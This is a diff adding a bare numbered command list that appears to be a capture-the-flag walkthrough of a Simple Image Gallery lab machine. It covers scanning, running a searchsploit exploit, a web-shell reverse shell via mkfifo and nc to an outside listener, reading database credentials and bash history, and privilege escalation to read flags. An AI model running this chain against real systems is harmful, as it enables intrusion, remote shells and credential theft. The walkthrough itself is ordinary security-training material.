@@ -1,0 +1,16 @@
+1 - nmap -A 10.10.179.218
+2 - searchsploit 'simple image gallery'
+3 - searchsploit -m 50214
+4 - python3 50214.py
+5 - http://10.10.179.218/gallery/uploads/1680167340_TagolbyclfnvdveoguzLetta.php?cmd=which%20netcat
+6 - http://10.10.179.218/gallery/uploads/1680167340_TagolbyclfnvdveoguzLetta.php?cmd=rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.8.94.51%204444%20%3E%2Ftmp%2Ff
+7 - cat /var/www/html/gallery/initialize.php
+8 - mysql -u gallery_user -p
+9 - show databases;
+10 - show tables;
+11 - select * from users;
+12 - cat /var/backups/mike_home_backup/.bash_history
+13 - su mike
+14 - cat /home/mike/user.txt
+15 - sudo -l (nano)
+16 - cat /root/root.txt
